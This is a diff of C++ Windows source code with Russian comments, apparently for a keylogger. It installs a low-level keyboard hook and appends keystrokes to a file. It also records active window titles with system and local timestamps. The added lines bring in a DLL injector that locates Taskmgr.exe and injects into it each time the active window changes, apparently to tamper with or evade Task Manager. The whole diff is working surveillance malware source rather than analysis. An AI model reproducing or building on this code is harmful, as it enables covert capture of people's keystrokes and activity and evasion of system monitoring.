@@ -1,26 +1,28 @@
+#define _CRT_SECURE_NO_WARNINGS
+
 #include <Windows.h>
 #include <string>
 #include "HandleUserInputs.h"
+#include "DLLinjector.h"
 
 #define maxChars 255
 
 HandleUserInput* hUserInp;
 int KeyId;
+SYSTEMTIME sTime, lTime;
+std::wstring str;
+char tempStr[64];
 
 
-////HookProc — это заполнитель для имени, определяемого приложением.
-//LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
-//{
-//	// process event
-//	if (nCode >= 0 && wParam == WM_KEYUP) {
-//		int vkCode = lParam;
-//		HandleUserInput::SetKeysState();
-//		std::string saveText = HandleUserInput::GetSymbol(vkCode);
-//		//TODO: File Append 
-//		HandleUserInput::AppendTextToFile(HandleUserInput::_filename, saveText);
-//	}
-//	return CallNextHookEx(NULL, nCode, wParam, lParam);
-//}
+int StringToWString(std::wstring& ws, const std::string& s)
+{
+	std::wstring wsTmp(s.begin(), s.end());
+
+	ws += wsTmp;
+
+	return 0;
+}
+
 
 //HookProc — это заполнитель для имени, определяемого приложением.
 LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -38,8 +40,6 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
 		saveText = hUserInp->GetSymbol(vkCode);
 		// 
 
-		// 
-		//TODO: File Append
 		hUserInp->AppendTextToFileW(saveText);
 	}
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -52,10 +52,36 @@ void CALLBACK ActiveWindowsHook(HWINEVENTHOOK hWinEventHook, DWORD eventType, HW
 	//char str[maxChars];
 	//sprintf_s(str, "%s %s %s", "\n", (char*)hUserInp->GetActiveWindowTitle(), "\n");
 	//hUserInp->AppendTextToFile(str);
+	DWORD PID;
 
-	std::wstring str(hUserInp->GetActiveWindowTitle());
+	char* PrName = (char*)"Taskmgr.exe";
+
+	if (PID = get_PID(PrName))
+	{
+		mainInjector(PID);
+	}
+	
+
+	LPWSTR titleStr = hUserInp->GetActiveWindowTitle();
+	if (titleStr == L"" || titleStr == L"\n") return;
+
+	str += L"\n-----------------------------------------\n";
+
+
+	GetSystemTime(&sTime);
+	GetLocalTime(&lTime);
+	
+	sprintf(tempStr, "The system time is: %02d:%02d\n", sTime.wHour, sTime.wMinute);
+	StringToWString(str, tempStr);
+	sprintf(tempStr, "The local time is: %02d:%02d-%02d.%02d.%04d\n", lTime.wHour, lTime.wMinute, lTime.wDay, lTime.wMonth, lTime.wYear);
+	StringToWString(str, tempStr);
+
+	
+	str += titleStr; 
 	str += L"\n";
+
 	hUserInp->AppendTextToFileW(str);
+	str = L"";
 }
 
 
@@ -101,6 +127,11 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR pCmdLin
 
 	hUserInp = new HandleUserInput(hWnd);
 
+
+	//
+
+
+	//
 
 	//hUserInp->HookId = hUserInp->SetHook(WH_KEYBOARD_LL, &HookProc);
 	hUserInp->HookId = hUserInp->SetHook(WH_KEYBOARD_LL, &HookProc, GetCurrentThreadId());
